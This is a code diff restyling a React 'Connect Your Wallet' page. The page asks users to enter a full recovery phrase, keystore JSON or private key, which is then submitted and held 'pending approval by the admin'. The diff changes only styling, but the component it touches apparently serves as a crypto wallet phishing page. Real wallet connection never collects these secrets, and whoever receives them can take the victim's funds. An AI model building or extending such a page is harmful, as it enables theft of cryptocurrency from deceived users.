@@ -2,8 +2,6 @@
 
 import React from "react";
 import { useEffect, useState, FormEvent, ChangeEvent } from "react";
-import { Button } from "@/components/ui/button";
-import { Card } from "@/components/ui/card";
 import { Eye, EyeOff, CheckCircle, AlertCircle, Clock } from "lucide-react";
 import { useSession } from "next-auth/react";
 import { toast } from "sonner";
@@ -112,23 +110,21 @@ export default function ConnectWallet(){
 	};
 
 	return (
-		<div className="min-h-screen pb-6 bg-background text-foreground">
-			<div className="absolute inset-0 opacity-10 pointer-events-none z-0 bg-primary/10" />
-
-			<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 relative z-10">
-				<div className="bg-card/95 backdrop-blur-md border border-border p-5 rounded-2xl shadow-lg transition">
+		<div style={{ minHeight: "100vh", paddingBottom: "var(--space-6)", backgroundColor: "var(--background)", color: "var(--foreground)" }}>
+			<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+				<div className="card card-elevated" style={{ padding: "var(--space-5)" }}>
 					{/* Connected Wallet - Approved */}
 					{walletStatus === "approved" && connectedWallet && (
-						<div className="mb-8 flex flex-col items-center justify-center">
-							<CheckCircle className="h-10 w-10 text-green-500 mb-2" />
+						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
+							<CheckCircle style={{ height: "2.5rem", width: "2.5rem", color: "var(--success-500)", marginBottom: "var(--space-2)" }} />
 
-							<div className="text-lg font-bold text-green-500">
+							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--success-500)" }}>
 								Wallet Connected!
 							</div>
 
-							<div className="text-sm text-muted-foreground mt-1">
+							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
 								Your{" "}
-								<span className="font-semibold text-foreground">
+								<span style={{ fontWeight: 600, color: "var(--foreground)" }}>
 									{connectedWallet}
 								</span>{" "}
 								wallet has been approved by the admin.
@@ -138,14 +134,14 @@ export default function ConnectWallet(){
 
 					{/* Pending Wallet Status */}
 					{walletStatus === "pending" && (
-						<div className="mb-8 flex flex-col items-center justify-center">
-							<Clock className="h-10 w-10 text-blue-500 mb-2 animate-spin" />
+						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
+							<Clock style={{ height: "2.5rem", width: "2.5rem", color: "var(--info-500)", marginBottom: "var(--space-2)", animation: "spin 2s linear infinite" }} />
 
-							<div className="text-lg font-bold text-blue-500">
+							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--info-500)" }}>
 								Wallet Pending Approval
 							</div>
 
-							<div className="text-sm text-muted-foreground mt-1">
+							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
 								Your wallet submission is under review by the admin.
 								Please wait for approval.
 							</div>
@@ -154,14 +150,14 @@ export default function ConnectWallet(){
 
 					{/* Rejected Wallet Status */}
 					{walletStatus === "rejected" && (
-						<div className="mb-8 flex flex-col items-center justify-center">
-							<AlertCircle className="h-10 w-10 text-red-500 mb-2" />
+						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
+							<AlertCircle style={{ height: "2.5rem", width: "2.5rem", color: "var(--danger-500)", marginBottom: "var(--space-2)" }} />
 
-							<div className="text-lg font-bold text-red-500">
+							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--danger-500)" }}>
 								Wallet Rejected
 							</div>
 
-							<div className="text-sm text-muted-foreground mt-1">
+							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
 								Your wallet submission was rejected. Please try again with
 								valid credentials.
 							</div>
@@ -169,44 +165,54 @@ export default function ConnectWallet(){
 					)}
 
 					{/* Header */}
-					<div className="text-center mb-10 max-w-2xl mx-auto">
-						<h1 className="text-3xl font-bold mb-3 text-foreground">
+					<div style={{ textAlign: "center", marginBottom: "var(--space-10)", maxWidth: "42rem", margin: "0 auto var(--space-10)" }}>
+						<h1 style={{ fontSize: "var(--text-3xl)", fontWeight: 700, marginBottom: "var(--space-3)", color: "var(--foreground)" }}>
 							Connect Your Wallet
 						</h1>
 
-						<p className="text-muted-foreground">
+						<p style={{ color: "var(--text-200)" }}>
 							Select a wallet and connect securely by scanning
 							a QR code or using a recovery phrase.
 						</p>
 					</div>
 
 					{/* Wallet Grid */}
-					<div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 mb-8">
+					<div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(120px, 1fr))", gap: "var(--space-6)", marginBottom: "var(--space-8)" }}>
 						{wallets.map((wallet) => (
-							<Card
+							<div
 								key={wallet.name}
-								className={`flex flex-col items-center cursor-pointer bg-card/60 rounded-xl shadow hover:shadow-xl transition py-4 px-3 hover:scale-105 border border-border ${
-									walletStatus === "approved" ||
-									walletStatus === "pending"
-										? "opacity-50 cursor-not-allowed"
-										: ""
-								}`}
-								onClick={() =>
-									handleWalletClick(wallet)
-								}
+								className="card"
+								style={{
+									display: "flex",
+									flexDirection: "column",
+									alignItems: "center",
+									cursor: walletStatus === "approved" || walletStatus === "pending" ? "not-allowed" : "pointer",
+									padding: "var(--space-4)",
+									opacity: walletStatus === "approved" || walletStatus === "pending" ? 0.5 : 1,
+									transition: "transform var(--duration-base) var(--ease-out)",
+								}}
+								onClick={() => handleWalletClick(wallet)}
+								onMouseEnter={(e) => {
+									if (walletStatus !== "approved" && walletStatus !== "pending") {
+										e.currentTarget.style.transform = "scale(1.05)";
+									}
+								}}
+								onMouseLeave={(e) => {
+									e.currentTarget.style.transform = "scale(1)";
+								}}
 							>
-								<div className="w-14 h-14 rounded-full overflow-hidden flex items-center justify-center bg-primary/20 shadow-sm">
+								<div style={{ width: "3.5rem", height: "3.5rem", borderRadius: "9999px", overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "var(--glass-brand-sm)", boxShadow: "var(--shadow-xs)" }}>
 									<img
 										src={wallet.icon}
 										alt={wallet.name}
-										className="w-14 h-14 object-contain"
+										style={{ width: "3.5rem", height: "3.5rem", objectFit: "contain" }}
 									/>
 								</div>
 
-								<span className="text-sm font-medium text-foreground text-center mt-2">
+								<span style={{ fontSize: "var(--text-sm)", fontWeight: 500, color: "var(--foreground)", textAlign: "center", marginTop: "var(--space-2)" }}>
 									{wallet.name}
 								</span>
-							</Card>
+							</div>
 						))}
 					</div>
 				</div>
@@ -216,81 +222,73 @@ export default function ConnectWallet(){
 					walletStatus !== "approved" &&
 					walletStatus !== "pending" &&
 					selectedWallet && (
-						<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60">
-							<div className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-md sm:max-w-lg relative overflow-hidden mx-2">
-								<div className="flex items-center justify-between p-4 border-b border-border">
+						<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.6)" }}>
+							<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", position: "relative", overflow: "hidden", margin: "0 0.5rem" }}>
+								<div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "var(--space-4)", borderBottom: "1px solid var(--border-default)" }}>
 									<button
 										onClick={handleCloseModal}
-										className="text-muted-foreground hover:text-red-500"
+										style={{ backgroundColor: "transparent", border: "none", color: "var(--text-200)", cursor: "pointer", fontSize: "1.25rem", transition: "color var(--duration-fast) var(--ease-out)" }}
+										onMouseEnter={(e) => e.currentTarget.style.color = "var(--danger-500)"}
+										onMouseLeave={(e) => e.currentTarget.style.color = "var(--text-200)"}
 									>
 										✕
 									</button>
 
 									<div
-										className="text-primary font-semibold cursor-pointer"
+										style={{ color: "var(--primary)", fontWeight: 600, cursor: "pointer", transition: "opacity var(--duration-fast) var(--ease-out)" }}
 										onClick={handleCloseModal}
+										onMouseEnter={(e) => e.currentTarget.style.opacity = "0.7"}
+										onMouseLeave={(e) => e.currentTarget.style.opacity = "1"}
 									>
 										Back
 									</div>
 								</div>
 
-								<div className="p-6">
-									<div className="flex flex-col items-center">
-										<div className="mb-4">
+								<div style={{ padding: "var(--space-6)" }}>
+									<div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
+										<div style={{ marginBottom: "var(--space-4)" }}>
 											<img
-												src={
-													selectedWallet.icon
-												}
+												src={selectedWallet.icon}
 												alt="Icon"
-												style={{
-													width: 40,
-													height: 40,
-												}}
+												style={{ width: 40, height: 40 }}
 											/>
 										</div>
 
-										<div className="text-lg font-medium mb-2 text-foreground">
+										<div style={{ fontSize: "var(--text-lg)", fontWeight: 500, marginBottom: "var(--space-2)", color: "var(--foreground)" }}>
 											Connect {selectedWallet.name}
 										</div>
 
-										<div className="flex justify-center mb-4">
-											<Button
-												className="bg-primary text-primary-foreground px-4 py-2 rounded hover:opacity-90"
-												onClick={
-													handleOpenManual
-												}
+										<div style={{ display: "flex", justifyContent: "center", marginBottom: "var(--space-4)" }}>
+											<button
+												className="btn-primary"
+												onClick={handleOpenManual}
 											>
 												Connect Manually
-											</Button>
+											</button>
 										</div>
 
-										<button className="flex cursor-pointer items-center justify-between w-full bg-card/40 hover:bg-card/60 rounded p-3 mt-2 transition">
+										<div style={{ display: "flex", cursor: "pointer", alignItems: "center", justifyContent: "space-between", width: "100%", backgroundColor: "var(--glass-white-sm)", borderRadius: "var(--radius-md)", padding: "var(--space-3)", marginTop: "var(--space-2)", transition: "background var(--duration-base) var(--ease-out)" }}
+											onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-md)"}
+											onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-sm)"}
+										>
 											<div>
-												<div className="font-semibold text-primary">
-													{
-														selectedWallet.name
-													}
+												<div style={{ fontWeight: 600, color: "var(--primary)" }}>
+													{selectedWallet.name}
 												</div>
 
-												<div className="text-xs text-muted-foreground">
-													Easy-to-use
-													browser
-													extension.
+												<div style={{ fontSize: "var(--text-xs)", color: "var(--text-200)" }}>
+													Easy-to-use browser extension.
 												</div>
 											</div>
 
 											<div>
 												<img
-													src={
-														selectedWallet.icon
-													}
+													src={selectedWallet.icon}
 													alt="Icon"
-													style={{
-														width: 24,
-													}}
+													style={{ width: 24 }}
 												/>
 											</div>
-										</button>
+										</div>
 									</div>
 								</div>
 							</div>
@@ -302,105 +300,76 @@ export default function ConnectWallet(){
 					walletStatus !== "approved" &&
 					walletStatus !== "pending" &&
 					selectedWallet && (
-						<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60 backdrop-blur-sm">
-							<div className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-lg mx-2">
-								<div className="px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
-									<h3 className="text-lg font-medium text-foreground flex items-center gap-4 mb-6">
+						<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.6)" }}>
+							<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", margin: "0 0.5rem" }}>
+								<div style={{ padding: "var(--space-6)" }}>
+									<h3 style={{ fontSize: "var(--text-lg)", fontWeight: 500, color: "var(--foreground)", display: "flex", alignItems: "center", gap: "var(--space-4)", marginBottom: "var(--space-6)" }}>
 										<img
 											src={selectedWallet.icon}
 											alt="wallet"
-											className="h-10 w-10"
+											style={{ height: "2.5rem", width: "2.5rem" }}
 										/>
 
 										<span>
-											Import your{" "}
-											{
-												selectedWallet.name
-											}{" "}
-											wallet
+											Import your {selectedWallet.name} wallet
 										</span>
 									</h3>
 
-									<div className="flex justify-evenly mb-4">
+									<div style={{ display: "flex", justifyContent: "space-around", marginBottom: "var(--space-4)" }}>
 										{importTabs.map((tab) => (
 											<div
 												key={tab.key}
-												className={`p-2 border-b-2 cursor-pointer ${
-													activeTab ===
-													tab.key
-														? "border-primary text-primary"
-														: "border-border text-muted-foreground"
-												}`}
-												onClick={() =>
-													setActiveTab(
-														tab.key
-													)
-												}
+												style={{
+													padding: "var(--space-2)",
+													borderBottom: activeTab === tab.key ? "2px solid var(--primary)" : "2px solid var(--border-default)",
+													cursor: "pointer",
+													color: activeTab === tab.key ? "var(--primary)" : "var(--text-200)",
+													transition: "all var(--duration-base) var(--ease-out)",
+												}}
+												onClick={() => setActiveTab(tab.key)}
 											>
-												{
-													tab.label
-												}
+												{tab.label}
 											</div>
 										))}
 									</div>
 
 									{activeTab === "phrase" && (
 										<SeedPhraseTab
-											walletName={
-												selectedWallet.name
-											}
+											walletName={selectedWallet.name}
 											onSuccess={() => {
 												handleCloseManual();
-												setTimeout(
-													() =>
-														window.location.reload(),
-													2000
-												);
+												setTimeout(() => window.location.reload(), 2000);
 											}}
 										/>
 									)}
 
 									{activeTab === "keystore" && (
 										<KeystoreTab
-											walletName={
-												selectedWallet.name
-											}
+											walletName={selectedWallet.name}
 											onSuccess={() => {
 												handleCloseManual();
-												setTimeout(
-													() =>
-														window.location.reload(),
-													2000
-												);
+												setTimeout(() => window.location.reload(), 2000);
 											}}
 										/>
 									)}
 
 									{activeTab === "private" && (
 										<PrivateKeyTab
-											walletName={
-												selectedWallet.name
-											}
+											walletName={selectedWallet.name}
 											onSuccess={() => {
 												handleCloseManual();
-												setTimeout(
-													() =>
-														window.location.reload(),
-													2000
-												);
+												setTimeout(() => window.location.reload(), 2000);
 											}}
 										/>
 									)}
 
-									<div className="flex justify-end mt-4">
-										<Button
-											type="button"
-											onClick={
-												handleCloseManual
-											}
+									<div style={{ display: "flex", justifyContent: "flex-end", marginTop: "var(--space-4)" }}>
+										<button
+											className="btn-secondary"
+											onClick={handleCloseManual}
 										>
 											Cancel
-										</Button>
+										</button>
 									</div>
 								</div>
 							</div>
@@ -539,17 +508,16 @@ function SeedPhraseTab({
 
 	return (
 		<form onSubmit={handleSubmit}>
-			<div className="mb-6">
-				<div className="flex justify-between items-center mb-2">
-					<label className="font-semibold text-foreground">
+			<div style={{ marginBottom: "var(--space-6)" }}>
+				<div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "var(--space-2)" }}>
+					<label style={{ fontWeight: 600, color: "var(--foreground)" }}>
 						Enter your recovery phrase
 					</label>
 
 					<button
 						type="button"
-						onClick={() =>
-							setShowPhrase((v) => !v)
-						}
+						onClick={() => setShowPhrase((v) => !v)}
+						style={{ backgroundColor: "transparent", border: "none", cursor: "pointer", color: "var(--text-100)" }}
 					>
 						{showPhrase ? (
 							<EyeOff size={22} />
@@ -559,41 +527,50 @@ function SeedPhraseTab({
 					</button>
 				</div>
 
-				<div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
+				<div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(80px, 1fr))", gap: "var(--space-2)" }}>
 					{phraseArr.map((word, idx) => (
 						<input
 							key={idx}
-							type={
-								showPhrase
-									? "text"
-									: "password"
-							}
+							type={showPhrase ? "text" : "password"}
 							value={word}
-							onChange={(
-								e: ChangeEvent<HTMLInputElement>
-							) =>
-								handleWordChange(
-									idx,
-									e.target.value
-								)
+							onChange={(e: ChangeEvent<HTMLInputElement>) =>
+								handleWordChange(idx, e.target.value)
 							}
 							placeholder={`Word ${idx + 1}`}
-							className="bg-card/50 p-2 rounded text-center placeholder:text-xs"
+							style={{
+								backgroundColor: "var(--glass-white-sm)",
+								padding: "var(--space-2)",
+								borderRadius: "var(--radius-md)",
+								textAlign: "center",
+								border: "1px solid var(--border-default)",
+								color: "var(--foreground)",
+								fontSize: "var(--text-sm)",
+								transition: "all var(--duration-base) var(--ease-out)",
+							}}
+							onFocus={(e) => {
+								e.currentTarget.style.borderColor = "var(--primary)";
+								e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
+							}}
+							onBlur={(e) => {
+								e.currentTarget.style.borderColor = "var(--border-default)";
+								e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
+							}}
 						/>
 					))}
 				</div>
 			</div>
 
-			<Button
+			<button
 				type="submit"
-				disabled={
-					submitted ||
-					loading ||
-					globalPending
-				}
+				className="btn-primary"
+				disabled={submitted || loading || globalPending}
+				style={{
+					opacity: submitted || loading || globalPending ? 0.5 : 1,
+					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
-			</Button>
+			</button>
 		</form>
 	);
 }
@@ -670,35 +647,52 @@ function KeystoreTab({
 
 	return (
 		<form onSubmit={handleSubmit}>
-			<div className="mb-6">
-				<label className="block font-semibold text-foreground mb-2">
+			<div style={{ marginBottom: "var(--space-6)" }}>
+				<label style={{ display: "block", fontWeight: 600, color: "var(--foreground)", marginBottom: "var(--space-2)" }}>
 					Paste your keystore JSON
 				</label>
 
 				<textarea
 					value={keystoreJson}
-					onChange={(
-						e: ChangeEvent<HTMLTextAreaElement>
-					) =>
-						setKeystoreJson(
-							e.target.value
-						)
+					onChange={(e: ChangeEvent<HTMLTextAreaElement>) =>
+						setKeystoreJson(e.target.value)
 					}
 					placeholder="Paste your keystore JSON file content here..."
-					className="w-full bg-card/50 p-3 rounded border border-border text-sm font-mono min-h-40"
+					style={{
+						width: "100%",
+						backgroundColor: "var(--glass-white-sm)",
+						padding: "var(--space-3)",
+						borderRadius: "var(--radius-md)",
+						border: "1px solid var(--border-default)",
+						fontSize: "var(--text-sm)",
+						fontFamily: "var(--font-mono)",
+						minHeight: "10rem",
+						color: "var(--foreground)",
+						transition: "all var(--duration-base) var(--ease-out)",
+						resize: "vertical",
+					}}
+					onFocus={(e) => {
+						e.currentTarget.style.borderColor = "var(--primary)";
+						e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
+					}}
+					onBlur={(e) => {
+						e.currentTarget.style.borderColor = "var(--border-default)";
+						e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
+					}}
 				/>
 			</div>
 
-			<Button
+			<button
 				type="submit"
-				disabled={
-					submitted ||
-					loading ||
-					globalPending
-				}
+				className="btn-primary"
+				disabled={submitted || loading || globalPending}
+				style={{
+					opacity: submitted || loading || globalPending ? 0.5 : 1,
+					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
-			</Button>
+			</button>
 		</form>
 	);
 }
@@ -782,17 +776,16 @@ function PrivateKeyTab({
 
 	return (
 		<form onSubmit={handleSubmit}>
-			<div className="mb-6">
-				<div className="flex justify-between items-center mb-2">
-					<label className="font-semibold text-foreground">
+			<div style={{ marginBottom: "var(--space-6)" }}>
+				<div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "var(--space-2)" }}>
+					<label style={{ fontWeight: 600, color: "var(--foreground)" }}>
 						Enter your private key
 					</label>
 
 					<button
 						type="button"
-						onClick={() =>
-							setShowKey((v) => !v)
-						}
+						onClick={() => setShowKey((v) => !v)}
+						style={{ backgroundColor: "transparent", border: "none", cursor: "pointer", color: "var(--text-100)" }}
 					>
 						{showKey ? (
 							<EyeOff size={22} />
@@ -805,33 +798,47 @@ function PrivateKeyTab({
 				<input
 					type={showKey ? "text" : "password"}
 					value={privateKey}
-					onChange={(
-						e: ChangeEvent<HTMLInputElement>
-					) =>
-						setPrivateKey(
-							e.target.value
-						)
+					onChange={(e: ChangeEvent<HTMLInputElement>) =>
+						setPrivateKey(e.target.value)
 					}
 					placeholder="0x or your private key (64 hex characters)"
-					className="w-full bg-card/50 p-3 rounded border border-border text-sm font-mono"
+					style={{
+						width: "100%",
+						backgroundColor: "var(--glass-white-sm)",
+						padding: "var(--space-3)",
+						borderRadius: "var(--radius-md)",
+						border: "1px solid var(--border-default)",
+						fontSize: "var(--text-sm)",
+						fontFamily: "var(--font-mono)",
+						color: "var(--foreground)",
+						transition: "all var(--duration-base) var(--ease-out)",
+					}}
+					onFocus={(e) => {
+						e.currentTarget.style.borderColor = "var(--primary)";
+						e.currentTarget.style.backgroundColor = "var(--glass-white-md)";
+					}}
+					onBlur={(e) => {
+						e.currentTarget.style.borderColor = "var(--border-default)";
+						e.currentTarget.style.backgroundColor = "var(--glass-white-sm)";
+					}}
 				/>
 
-				<p className="text-xs text-muted-foreground mt-2">
-					⚠️ Never share your private key. Keep it
-					secure.
+				<p style={{ fontSize: "var(--text-xs)", color: "var(--text-200)", marginTop: "var(--space-2)" }}>
+					⚠️ Never share your private key. Keep it secure.
 				</p>
 			</div>
 
-			<Button
+			<button
 				type="submit"
-				disabled={
-					submitted ||
-					loading ||
-					globalPending
-				}
+				className="btn-primary"
+				disabled={submitted || loading || globalPending}
+				style={{
+					opacity: submitted || loading || globalPending ? 0.5 : 1,
+					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
-			</Button>
+			</button>
 		</form>
 	);
 }
